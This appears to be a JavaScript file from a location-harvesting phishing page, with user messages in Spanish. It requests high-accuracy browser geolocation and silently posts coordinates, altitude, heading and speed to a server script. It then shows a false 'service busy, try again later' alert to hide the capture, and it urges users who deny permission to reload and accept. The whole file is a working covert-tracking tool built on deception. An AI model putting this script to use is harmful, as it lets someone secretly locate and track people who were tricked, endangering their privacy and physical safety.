function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('Navegador no soportado.');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: './php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){$('#change').html('Procesando...');},
      mimeType: 'text'
    });
    alert('Nuestro servicio se está usando por muchas personas en este momento, vuelva a intentar en unos minutos.');
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'Se debe aceptar el permiso para poder funcionar.';
      alert('Por favor, recargue la página y acepte el permiso.');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Información no disponible.';
			break;
		case error.TIMEOUT:
			var timeout = 'La petición ha tardado mucho tiempo.';
      alert('Configure su ubicación en modo de alta precisión.');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'Ha ocurrido un error desconocido.';
			break;
	}

  $.ajax({
    type: 'POST',
    url: './php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Falló');},
    mimeType: 'text'
  });
}
